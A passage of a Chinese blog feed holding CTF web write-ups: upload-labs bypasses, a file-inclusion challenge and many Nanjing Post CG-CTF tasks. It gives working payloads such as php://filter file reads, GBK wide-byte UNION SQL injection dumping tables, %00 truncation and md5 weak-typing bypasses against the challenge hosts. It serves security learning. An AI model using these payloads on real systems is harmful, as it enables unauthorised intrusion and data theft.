可以通过对比上传前后的图片内容</p><p>找到上传前没有改变的部分将一句话写道没有改变的这部分尝试一下</p><p>由于我这里没有16进制编辑器 就不尝试了 不过应该没有问题。。</p><p>google看到的copy过来 对渲染了解的少 需要多了解了解。</p><p><strong>将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</strong></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>考察条件竞争</p><p>如果你要问条件竞争是什么，可以看一下这篇文章</p><p><a href="https://shuaizhupeiqi.github.io/2018/11/15/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">CTF中的条件竞争漏洞</a></p><p>关于条件竞争不怎么明白 Google了半天发现无法突破本关 </p><p>于是厚着脸皮让国光哥来远程。。。涨姿势了</p><p>总结出来一句话利用burp批量发包 让程序措手不及</p><p>上传1.php抓包</p><p><img src="https://i.loli.net/2019/04/27/5cc47b784a603.png" alt="1556373645543.png"><br><img src="https://i.loli.net/2019/04/27/5cc47b78637ed.png" alt="1556373629324.png"><br><img src="https://i.loli.net/2019/04/27/5cc47b7a6d648.png" alt="1556373601185.png"></p><p>线程设置高一点 开始不断发包 在我和国光哥的10分钟不断刷新下果然成功了。。。</p><p>产生原因将文件上传，然后判断后缀是否是图片，如果不是图片文件则将其删除。</p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>条件竞争</p><p>利用<code>Pass-17</code>方法一样可以利用</p><p>但是我这边一直没有成功呢。。。姿势问题</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>到了这里发现越来越简单</p><p>move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过</p><p><img src="https://i.loli.net/2019/04/27/5cc47b1371aa0.png" alt="1.png"></p><p>感觉这题和12题有点类似</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>西湖论剑web 3题 解析</title>
      <link href="/2019/04/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-3%E9%A2%98-%E8%A7%A3%E6%9E%90/"/>
      <url>/2019/04/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web-3%E9%A2%98-%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>西湖论剑的题目 前些天没有做 今天西湖论剑的题目重新放了出来 可以复现了</p><p>故来做一下web题目 题目质量较高</p><p><img src="https://i.loli.net/2019/04/11/5caf00c571680.jpg" alt="Xnip2019-04-11_16-54-10.jpg"></p><a id="more"></a><h2 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h2><p><img src="https://i.loli.net/2019/04/11/5caf012737d97.jpg" alt="Xnip2019-04-11_16-55-57.jpg"></p><p>打开题目连接 看到一个类似博客界面 都不是重点 重点是看到了</p><p><code>include $_GET[&#39;file&#39;]</code></p><p>看到这突然想到题目考查的应该是文件包含相关知识</p><p>故试一下</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/11/5caf025fce103.jpg" alt="Xnip2019-04-11_17-01-08.jpg"></p><p>两端base64加密的内容 第一段为index.php加密后的内容</p><p>base解密后为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!$a) &#123;</span></span><br><span class="line"><span class="php">$a = <span class="string">'./templates/index.html'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">die</span>(<span class="string">'nonono'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $a;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--hint: ZGlyLnBocA== --&gt;</span></span><br></pre></td></tr></table></figure><p>貌似用处不大 不过第二段的<code>&lt;!--hint: ZGlyLnBocA== --&gt;</code></p><p>解密后为<code>dir.php</code></p><p>访问一下</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//61.164.47.198:10000/dir.php</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/11/5caf03a35ecf1.jpg" alt="Xnip2019-04-11_17-06-33.jpg"></p><p>接下来利用文件包含 包含<code>dir.php</code>这个文件。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">61.164</span><span class="number">.47</span><span class="number">.198</span>:<span class="number">10000</span>/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure><p>base64解密后得到 <code>dir.php</code>源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = @$_GET[<span class="string">'dir'</span>]; <span class="comment">//dir通过接收数据并复制给变量a</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$a)&#123; </span></span><br><span class="line"><span class="php">$a = <span class="string">'/tmp'</span>;<span class="comment">//默认a的路径</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">var_dump(scandir($a)); <span class="comment">//列出指定路径中的文件和目录</span></span></span><br></pre></td></tr></table></figure><p>也就是说dir.php可以读取你输入的目录并展示目录下的所有文件</p><p>自己想的是 如果我输入某目录 就会展示出目录下所有文件 文件夹名 之后我是不是可以利用文件包含 读取任意文件的内容呢？？</p><p>经过测试 发现<code>ffffflag_is_Her4</code>文件</p><p>估计flag在文件内</p><p><img src="https://i.loli.net/2019/04/11/5caf2a25e9eb1.jpg" alt="Xnip2019-04-11_17-18-01.jpg"></p><p>利用文件包含读取内容</p><p><img src="https://i.loli.net/2019/04/11/5caf2b5ea7cc7.jpg" alt="Xnip2019-04-11_17-20-24.jpg"></p><p>果然发现flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;8dc25fd21c52958f777ce92409e2802a&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 目录遍历 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>南邮CG-CTF</title>
      <link href="/2019/04/01/%E5%8D%97%E9%82%AECG-CTF/"/>
      <url>/2019/04/01/%E5%8D%97%E9%82%AECG-CTF/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/27/5c9b0ed6ce874.png" alt="屏幕快照 2019-03-27 下午1.48.44.png"></p><p>第一次写ctf的wp 有些表达的可能不是很清楚</p><p>题目感觉质量很高 也很有趣哈 只写了部分web题目 pwn crypto不涉及 不要问我为什么 厂长是我表哥</p><a id="more"></a><h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><p>签到题 右键查看源代码</p><p><img src="https://i.loli.net/2019/03/27/5c9b140960983.png" alt="屏幕快照 2019-03-27 下午2.11.02.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;flag_admiaanaaaaaaaaaaa&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p><img src="https://i.loli.net/2019/03/27/5c9b123edb4fe.png" alt="屏幕快照 2019-03-27 下午2.03.29.png"></p><p>源码中可以看出 变量a经过get方式传递 ,a的值不等于<code>QNKCDZO</code></p><p>但<code>a</code>的只经过md5加密后等于 <code>QNKCDZO</code>加密后的值 看似很矛盾</p><p>发现</p><p><code>QNKCDZO</code>加密后的值是<code>0e830400451993494058024219903391</code></p><p>是0e开头的，PHP 把它当作科学计数法，0 的无论多少次方都是零</p><p>所以我们找到md5加密后的值是0e开头的即可</p><p>这里我用<code>s878926199a</code></p><p><img src="https://i.loli.net/2019/03/27/5c9b145104985.png" alt="屏幕快照 2019-03-27 下午2.12.19.png"></p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;md<span class="number">5_</span>collision<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>easy&#125;</span><br></pre></td></tr></table></figure><h2 id="签到题2"><a href="#签到题2" class="headerlink" title="签到题2"></a>签到题2</h2><p><img src="https://i.loli.net/2019/03/27/5c9b16b30d74f.png" alt="QQ20190327-142231@2x.png"></p><p>复制了口令点击开门发现提交的时候少了一个n</p><p>查看源代码发现 最大长度为10</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">"password"</span> <span class="attribute">value</span>=<span class="string">""</span> <span class="attribute">name</span>=<span class="string">"text1"</span> <span class="attribute">maxlength</span>=<span class="string">"10"</span>&gt;</span><br></pre></td></tr></table></figure><p>限制了长度改成11即可</p><p><img src="https://i.loli.net/2019/03/27/5c9b183c3fd27.png" alt="屏幕快照 2019-03-27 下午2.26.54.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;follow_me_to_exploit&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="这题不是web"><a href="#这题不是web" class="headerlink" title="这题不是web"></a>这题不是web</h2><p><img src="https://i.loli.net/2019/03/27/5c9b193dbc105.png" alt="屏幕快照 2019-03-27 下午2.33.06.png"></p><p>放了一张图。先保存到本地</p><p><img src="https://i.loli.net/2019/03/27/5c9b1be025dbd.png" alt="屏幕快照 2019-03-27 下午2.43.28.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;photo_can_also_hid3_msg&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="层层递进"><a href="#层层递进" class="headerlink" title="层层递进"></a>层层递进</h2><p><img src="https://i.loli.net/2019/03/27/5c9b223676583.png" alt="屏幕快照 2019-03-27 下午3.11.08.png"></p><p>这题本来是没有思路的 请教了下国光哥</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;<span class="keyword">this</span><span class="number">_</span><span class="keyword">is</span><span class="number">_</span>a<span class="number">_f</span>l<span class="number">4</span>g&#125;</span><br></pre></td></tr></table></figure><h2 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h2><p>打开以后一大堆乱码。。以txt文件保存到本地</p><p>之后把保存在txt的文件内容粘贴到审查元素下的<code>Console</code></p><p><img src="https://i.loli.net/2019/03/27/5c9b230fb0b20.png" alt="屏幕快照 2019-03-27 下午3.15.11.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;javascript_aaencode&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h2><p>点一下超链接 抓包一下看看</p><p><img src="https://i.loli.net/2019/03/27/5c9b258034cc1.png" alt="屏幕快照 2019-03-27 下午3.25.25.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;yougotit_script_now&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h2><p><img src="https://i.loli.net/2019/03/27/5c9b27a4bd940.png" alt="屏幕快照 2019-03-27 下午3.34.48.png"></p><p>给出代码 </p><p>大体意思是，声明一个函数 把接收到的<code>ZzvSWE</code>变量的值 进行base64解密后 再次进行<code>gzinflate</code>加密 之后遍历每个字符 的ascii的值 -1最后在转化为字符串。</p><p>mac下安装了集成环境 把代码copy一下放到网站目录 打开后发现什么都不显示 分析一下代码倒数第二行的eval </p><p>eval是把任何字符串当做php代码来执行 而php代码是不能在前台显示出来的 (自己是这样理解 不知道对不对)</p><p>eval换成echo即可</p><p><img src="https://i.loli.net/2019/03/27/5c9b2c2423761.png" alt="屏幕快照 2019-03-27 下午3.53.55.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>这题用到php伪协议的知识 自己对这块不怎么了解 有时间要总结一下php伪协议的知识。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">4</span>.chinalover.sinaapp.<span class="keyword">com</span>/web7/<span class="built_in">index</span>.php?<span class="keyword">file</span>=show.php</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">4</span>.chinalover.sinaapp.<span class="keyword">com</span>/web7/<span class="built_in">index</span>.php?<span class="keyword">file</span>=php://<span class="built_in">filter</span>/convert.base64-encode/resource=<span class="built_in">index</span>.php</span><br></pre></td></tr></table></figure><p>php代码是不能再前台显示的 所以需要进行base64加密，显示到前台以后，base解密即可</p><p><img src="https://i.loli.net/2019/03/27/5c9b2e30b68eb.png" alt="屏幕快照 2019-03-27 下午4.02.38.png"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;edulcni_elif_lacol_si_siht&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><h2 id="单身一百年也没有用"><a href="#单身一百年也没有用" class="headerlink" title="单身一百年也没有用"></a>单身一百年也没有用</h2><p>还是抓包一下看看</p><p><img src="https://i.loli.net/2019/03/27/5c9b301c48fdc.png" alt="屏幕快照 2019-03-27 下午4.08.48.png"></p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;<span class="keyword">this</span><span class="number">_</span><span class="keyword">is</span><span class="number">_302_</span>redirect&#125;</span><br></pre></td></tr></table></figure><h2 id="Download"><a href="#Download" class="headerlink" title="Download~!"></a>Download~!</h2><p>题目挂了</p><p><img src="https://i.loli.net/2019/03/27/5c9b30e06bb8d.jpg" alt="C79CFE657251B0C0493C07035C60C329.jpg"></p><h2 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h2><p>TIP: 0==not</p><p>抓包看一下 根据提示 <code>0==not</code></p><p><img src="https://i.loli.net/2019/03/27/5c9b6bf355c40.png" alt="屏幕快照 2019-03-27 下午8.26.13.png"></p><p>我们修改<code>login=1</code></p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;cookie<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>different<span class="number">_f</span>rom<span class="number">_</span>session&#125;</span><br></pre></td></tr></table></figure><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p><img src="https://i.loli.net/2019/03/27/5c9b6ce5d524a.png" alt="屏幕快照 2019-03-27 下午8.30.08.png"></p><p>点开题目连接 根据<code>Do you know robots.txt？</code></p><p><img src="https://i.loli.net/2019/03/27/5c9b6d630ef8a.png" alt="屏幕快照 2019-03-27 下午8.32.18.png"></p><p>这题最开始有点疑问 感觉是sql注入 后面百度了一下才知道思路不对</p><p>考的是intval()的用法 intval把变量转化为整数</p><p>id=1024.01就能绕过爆出flag</p><p><code>nctf{query_in_mysql}</code></p><h2 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h2><p>进入解题连接后发现本题考查sql注入 输入<code>&#39;</code>看一下</p><p><img src="https://i.loli.net/2019/03/27/5c9b723b764b0.png" alt="屏幕快照 2019-03-27 下午8.52.58.png"></p><p>果然被转义了。。。这时候看到题目名字gbk 貌似明白了</p><p>宽字节注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>发现存在<code>ctf,ctf2,ctf3,ctf4,news</code>表</p><p>ctf感觉有戏 先看一下ctf表下的字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x637466</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>发现<code>user,pw</code>字段</p><p>接下来查看数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">user</span>,pw) <span class="keyword">from</span> ctf<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/03/27/5c9b80ef13c31.png" alt="屏幕快照 2019-03-27 下午9.55.21.png"></p><p>果然</p><p>美滋滋的跑去提交 发现flag不对？？？？？？？？？？</p><p>之后我每个表都试了一下 发现ctf4下也有一个falg</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="keyword">this</span><span class="number">_</span><span class="keyword">is</span><span class="number">_</span>sqli<span class="number">_f</span>lag&#125;</span><br></pre></td></tr></table></figure><p>格式感觉就不对 姿势盲区了百度了一下 发现前辈们也是在ctf4下发现的flag是</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">nctf</span><span class="template-variable">&#123;gbk_3sqli&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure><p>不知道怎么回事 不自信的我复制了前辈的payload爆出的flag也是<code>flag{this_is_sqli_flag}</code>看来真的是题目本身的问题了。。</p><h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><p><img src="https://i.loli.net/2019/03/27/5c9b8e5f3856d.png" alt="屏幕快照 2019-03-27 下午10.52.57.png"></p><p>又是一道看似很矛盾的题目 </p><p>这里用数组直接可以绕过</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf</span>[<span class="string"></span>]=1</span><br></pre></td></tr></table></figure><p>爆出flag<code>nctf{use_00_to_jieduan}</code></p><p>本题提示说有多种解题方法 题目名字让我想到了应该可以00截断</p><p>ereg函数存在%00截断漏洞，当遇到%00(NULL)时，函数就截止了</p><p>strpos函数 查找#biubiubiu在nctf变量接收的值中第一次出现的位置</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1<span class="number">%00</span><span class="number">%23</span>biubiubiu</span><br></pre></td></tr></table></figure><h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><p>这道题呢和<code>md5 collision</code>考查的是一个点弱类型</p><p><img src="https://i.loli.net/2019/03/28/5c9c67ea473f3.png" alt="屏幕快照 2019-03-28 下午2.21.13.png"></p><p>get方式接受 a b两个参数 使得a不等于b 但md5加密后a的值必须等于md5加密后b的值 这里我直接用<code>QNKCDZO</code> <code>s878926199a</code>不只这两个很多加密后的值都是0e开头的详情百度一下</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//chinalover.sinaapp.com/web17/index.php?a=QNKCDZO&amp;b=s878926199a</span></span><br></pre></td></tr></table></figure><p><code>nctf{php_is_so_cool}</code></p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p><img src="https://i.loli.net/2019/03/28/5c9c729947917.png" alt="屏幕快照 2019-03-28 下午3.06.51.png"></p><p>点一下<code>/source.php</code></p><p>出现index.php的源码</p><p><img src="https://i.loli.net/2019/03/28/5c9c7352b17db.png" alt="QQ20190328-150943@2x.png"></p><p><code>extract()</code>函数的作用：从数组中将变量导入到当前的符号表 由于此函数存在变量覆盖漏洞 给pass赋值就覆盖了原值所以post下直接提交 两个变量的值相等就会爆出flag</p><p><img src="https://i.loli.net/2019/03/28/5c9c7a5ecc7c4.png" alt="屏幕快照 2019-03-28 下午3.39.55.png"></p><p><code>nctf{bian_liang_fu_gai!}</code></p><h2 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h2><p>貌似也挂了</p><p><img src="https://i.loli.net/2019/03/27/5c9b30e06bb8d.jpg" alt="C79CFE657251B0C0493C07035C60C329.jpg"></p><h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p><img src="https://i.loli.net/2019/03/28/5c9c8702cec1e.png" alt="屏幕快照 2019-03-28 下午4.33.57.png"></p><p>抓包修改<code>X-Forwarded-For: 127.0.0.1</code></p><p>貌似没用 偷偷看了国光哥的wp 姿势没问题 题目出现了点问题</p><p>网上flag</p><p><code>nctf{happy_http_headers}</code></p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>题目又挂了。。</p><p><img src="https://i.loli.net/2019/03/27/5c9b30e06bb8d.jpg" alt="C79CFE657251B0C0493C07035C60C329.jpg"></p><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p><img src="https://i.loli.net/2019/03/28/5c9c8b820e7f8.png" alt="屏幕快照 2019-03-28 下午4.53.02.png"></p><p>一次实战很多次ctf遇到类似突破上传的方法</p><p>以前单独总结过这种方法写的很详细</p><p><a href="https://scholar10.github.io/2018/12/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">常见的突破上传姿势</a></p><p><code>nctf{welcome_to_hacks_world}</code></p><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p><img src="https://i.loli.net/2019/04/01/5ca1f40588b23.png" alt="QQ20190401-192001@2x.png"></p><p>打开解题连接出现此页面 点击<code>Source</code>查看源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">Secure Web Login</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span></span><br><span class="line"><span class="php">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span></span><br><span class="line"><span class="php">  mysql_select_db(SAE_MYSQL_DB);</span></span><br><span class="line"><span class="php">  $user = trim($_POST[user]);</span></span><br><span class="line"><span class="php">  $pass = md5(trim($_POST[pass]));</span></span><br><span class="line"><span class="php">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span></span><br><span class="line"><span class="php">  $query = mysql_fetch_array(mysql_query($sql));</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $query[user];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">index.php</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">user</span> <span class="attr">value</span>=<span class="string">"Username"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">pass</span> <span class="attr">value</span>=<span class="string">"Password"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.phps"</span>&gt;</span>Source<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解题的关键核心语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> ctf <span class="keyword">where</span> (<span class="keyword">user</span>=<span class="string">'".$user."'</span>) <span class="keyword">and</span> (pw=<span class="string">'".$pass."'</span>)<span class="string">";</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 